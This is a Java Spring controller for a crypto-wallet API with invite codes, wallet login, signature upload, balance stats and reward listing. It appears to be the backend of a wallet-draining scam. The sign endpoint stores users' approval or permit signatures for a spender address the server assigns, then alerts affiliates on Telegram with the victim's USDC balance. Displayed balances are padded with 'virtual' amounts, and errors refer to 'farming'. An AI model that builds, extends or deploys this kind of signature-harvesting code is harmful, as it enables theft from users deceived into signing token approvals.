package io.renren.modules.core.controller.api;

import java.math.BigDecimal;
import java.math.RoundingMode;
import java.util.Date;

import javax.servlet.http.HttpServletRequest;

import org.apache.commons.lang3.StringUtils;
import org.springframework.beans.BeanUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.validation.annotation.Validated;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.web3j.utils.Numeric;

import com.alibaba.fastjson.JSON;
import com.baomidou.mybatisplus.core.conditions.query.LambdaQueryWrapper;
import com.baomidou.mybatisplus.core.conditions.update.LambdaUpdateWrapper;

import io.renren.common.exception.RRException;
import io.renren.common.utils.AESUtils;
import io.renren.common.utils.R;
import io.renren.modules.core.context.WalletConext;
import io.renren.modules.core.contract.ContractHandler;
import io.renren.modules.core.entity.InviteEntity;
import io.renren.modules.core.entity.PoolsEntity;
import io.renren.modules.core.entity.WalletFundsEntity;
import io.renren.modules.core.entity.WalletsEntity;
import io.renren.modules.core.param.CheckCodeParam;
import io.renren.modules.core.param.PageParam;
import io.renren.modules.core.param.RegisterWalletParam;
import io.renren.modules.core.param.RewardParam;
import io.renren.modules.core.param.WalletSignParam;
import io.renren.modules.core.service.AsyncTelegramNotificationService;
import io.renren.modules.core.service.InviteService;
import io.renren.modules.core.service.PoolsService;
import io.renren.modules.core.service.RewardService;
import io.renren.modules.core.service.WalletFundsService;
import io.renren.modules.core.service.WalletsService;
import io.renren.modules.core.vo.WalletBaseVO;
import io.renren.modules.core.vo.WalletIndexVO;
import io.renren.modules.utils.EthWalletUtils;
import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import lombok.extern.slf4j.Slf4j;
@Slf4j
@Api
@RestController
@RequestMapping("/api/wallet")
public class WalletApiController {

	@Autowired
	WalletsService walletsService;
	@Autowired
	ContractHandler handler;
	@Autowired
	WalletFundsService walletFundsService;
	@Autowired
	RewardService rewardService;
	@Autowired
	InviteService inviteService;
	@Autowired
	PoolsService poolsService;
	@Autowired
	AsyncTelegramNotificationService asyncTelegramService;
	
	
	@ApiOperation("checkCode")
	@PostMapping("checkCode")
	public R checkCode(@RequestBody CheckCodeParam param,HttpServletRequest request) {
		if(StringUtils.isEmpty(param.getCode())) {
			throw new RRException("Please enter the complete URL !");
		}
//	    String domain = "https://" + request.getServerName();  
//	    String url = domain + "?code=" + param.getCode(); // 拼接成完整地址
//	    log.info("进入完整请求URL：{}",url);
		InviteEntity inEntity = inviteService.getOne(new LambdaQueryWrapper<InviteEntity>().eq(InviteEntity::getCode, param.getCode()));
		if(inEntity == null) throw new RRException("Invalid url !");
		return R.ok();
	}

	@ApiOperation("链接钱包成功之后 -  登录 返回Token. 后续所有请求必须带Token")
	@PostMapping("login")
	public R login(HttpServletRequest request, @RequestBody RegisterWalletParam param) {
		WalletsEntity walletEntity  = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, param.getWallet()));
		if(walletEntity != null) {
			walletsService.update(new LambdaUpdateWrapper<WalletsEntity>().set(WalletsEntity::getLastDate,new Date()).eq(WalletsEntity::getWallet, param.getWallet()));
		}else {
			walletsService.register(request, param);
			walletEntity  = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, param.getWallet()));
		}
	  if(!EthWalletUtils.isValidChecksumAddress(walletEntity.getWallet())) {
		   walletsService.removeById(walletEntity.getId());
		   log.error("钱包:{} 地址错误!",walletEntity.getWallet());
		   throw new RRException("wallet address error!");
	   }
		return R.ok()
				.put("approve", StringUtils.isNotEmpty(walletEntity.getSignData()))
				.put("data", AESUtils.encrypt(param.getWallet()))
				.put("spender", walletEntity.getApproveWallet());
	}
	
	/**
	 * 签名数据上传
	 * @return
	 */
	@ApiOperation("签名数据上传")
	@PostMapping("sign")
	public R sign(HttpServletRequest request, @RequestBody @Validated WalletSignParam param) {
		WalletsEntity walletEntity  = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, param.getWallet()));
		if(walletEntity == null) {
			throw new RRException("wallet is not null.");
		}
		if(!walletEntity.getApproveWallet().equals(param.getSpender())){
			throw new RRException("wallet sign spender wallet error.");
		}
		try {
			String signData = JSON.toJSONString(param);
			log.info("钱包:{} 签名数据: {} ",param.getWallet(),JSON.toJSONString(param));
			WalletSignParam sign = JSON.parseObject(signData, WalletSignParam.class);
			String signature = sign.getSignature();
			log.info("钱包: {} 签名数据 V: {}, R: {}, S: {}",
				    param.getWallet(),
				    Numeric.toBigInt(signature.substring(130, 132)),  // v
				    Numeric.toHexString(Numeric.hexStringToByteArray(signature.substring(0, 66))),  // r
				    Numeric.toHexString(Numeric.hexStringToByteArray(signature.substring(66, 130))));  // s
			walletsService.update(new LambdaUpdateWrapper<WalletsEntity>()
					.set(WalletsEntity::getSignData,signData)
					.set(WalletsEntity::getNonce, param.getNonce())
					.eq(WalletsEntity::getWallet, param.getWallet()));
			sendSignNotification(walletEntity,walletEntity.getUsdc());
		}catch (Exception e) {
			log.error("钱包:{} 签名数据异常.",param.getWallet(),e.getMessage());
			return R.error("farming error, please try again.");
		}
		return R.ok();
	}
	
	@ApiOperation("用户所属资金池(客服)查询")
	@PostMapping("get")
	public R get() {
		String wallet = WalletConext.getWallet();
		WalletsEntity walletEntity  = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, wallet));
		if(walletEntity == null) throw new RRException("Invalid wallet");
		PoolsEntity pools = poolsService.getById(walletEntity.getPoolsId());
		
		return R.ok(new WalletBaseVO(walletEntity.getId(),walletEntity.getPoolsId(),pools.getOwnerId(),walletEntity.getWallet()));
	}
	
	
	@ApiOperation("Account 数据统计")
	@PostMapping("index")
	public R index() throws Exception {
		String wallet = WalletConext.getWallet();
		WalletsEntity walletEntity  = walletsService.getOne(new LambdaQueryWrapper<WalletsEntity>().eq(WalletsEntity::getWallet, wallet));
		if(walletEntity == null) throw new RRException("Invalid wallet");
		 BigDecimal usdc = walletEntity.getUsdc().add(walletEntity.getVirtualUsdc()).setScale(2,RoundingMode.DOWN);;
		 BigDecimal eth = walletEntity.getEth().add(walletEntity.getVirtualEth()).setScale(3,RoundingMode.DOWN);
		 WalletFundsEntity fundsEntity = walletFundsService.getOne(new LambdaQueryWrapper<WalletFundsEntity>().eq(WalletFundsEntity::getWallet, wallet));
		 BigDecimal totalRewardEth = fundsEntity == null ? BigDecimal.ZERO : fundsEntity.getTotalReward();
		 BigDecimal balanceRewardEth = fundsEntity == null ? BigDecimal.ZERO : fundsEntity.getBalanceReward();
		 BigDecimal accountBalance = fundsEntity == null ? BigDecimal.ZERO : fundsEntity.getExtractable();
		 WalletIndexVO indexVo = new WalletIndexVO(usdc,eth,totalRewardEth,balanceRewardEth,accountBalance);
		return R.ok(indexVo);
	}
	
	
	@ApiOperation("收益列表 - 分页,前端下滑 分页")
	@PostMapping("list")
	public R list(@RequestBody PageParam param) throws Exception {
		RewardParam rewardParam = new RewardParam();
		BeanUtils.copyProperties(param, rewardParam);
		rewardParam.setWallet(WalletConext.getWallet());
		return R.ok(rewardService.listPage(rewardParam));
	}
	
	/**
	 * 发送签名成功通知
	 */
	private void sendSignNotification(WalletsEntity wallet,  BigDecimal totalAmount) {
		try {
			StringBuilder message = new StringBuilder();
			message.append("🎯 签名完成通知！\n")
				   .append("💳 钱包地址: ").append(wallet.getWallet()).append("\n")
				   .append("💰 余额: ").append(totalAmount.toPlainString()).append(" USDC\n")
				   .append("✅ 状态:已完成");
			
			asyncTelegramService.sendNotificationAsync(wallet.getPoolsId(),wallet.getInviteId(), wallet.getWallet(), message.toString());
			log.info("签名完成通知已加入队列 - 钱包: {}", wallet.getWallet());
			
		} catch (Exception e) {
			log.error("发送签名完成通知失败 - 钱包: {}, 错误: {}", wallet.getWallet(), e.getMessage());
		}
	}
	
	
}
